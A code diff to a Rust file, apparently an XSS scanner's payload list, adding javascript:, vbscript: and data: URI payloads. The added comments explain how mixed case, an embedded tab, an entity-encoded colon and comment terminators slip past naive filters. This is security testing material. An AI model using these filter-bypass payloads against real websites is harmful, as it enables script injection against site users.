@@ -39,7 +39,20 @@ pub struct PayloadArgs {
 fn uri_scheme_payloads() -> &'static [&'static str] {
     &[
         "javascript:alert(1)",
+        // Comment terminator swallows anything appended after the injection.
+        "javascript:alert(1)//",
+        // Mixed case defeats a naive lowercase `javascript` scheme match.
+        "jaVasCript:alert(1)",
+        // Literal TAB inside the scheme; URL parsers strip TAB/LF/CR, so a
+        // filter that misses it still resolves the scheme to `javascript:`.
+        "java\tscript:alert(1)",
+        // Entity-encoded colon; decodes back to `:` in an HTML attribute.
+        "javascript&colon;alert(1)",
+        // Legacy IE scheme, still worth probing on old surfaces.
+        "vbscript:msgbox(1)",
         "data:text/html;,<svg/onload=alert(1)>",
+        // Plain (non-base64) data URL, distinct from the encoded variants below.
+        "data:text/html,<script>alert(1)</script>",
         "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoNDUpPg==",
         "data:application/xml;base64,PGhhaHd1bDpzY3JpcHQgeG1sbnM6aGFod3VsPSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sJz5wcm9tcHQoNDUpPC9oYWh3dWw6c2NyaXB0Pg==",
         "data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxMCIgaGVpZ2h0PSIxMCIgaWQ9InhzcyI+PHNjcmlwdCB0eXBlPSJ0ZXh0L2VjbWFzY3JpcHQiPmFsZXJ0KDQ1KTs8L3NjcmlwdD48L3N2Zz4=",
@@ -59,7 +72,8 @@ fn special_chars_payloads() -> &'static [&'static str] {
         // URL-encoded variants
         "%3C", "%3E", "%22", "%27", "%60", "%28", "%29", // Double URL-encoded
         "%253C", "%253E", // Unicode escapes (JS string context)
-        "\\u003c", "\\u003e", "\\x3c", "\\x3e",
+        "\\u003c", "\\u003e", "\\x3c", "\\x3e", // Comment openers and the null byte
+        "//", "/*", "%00",
     ]
 }
 
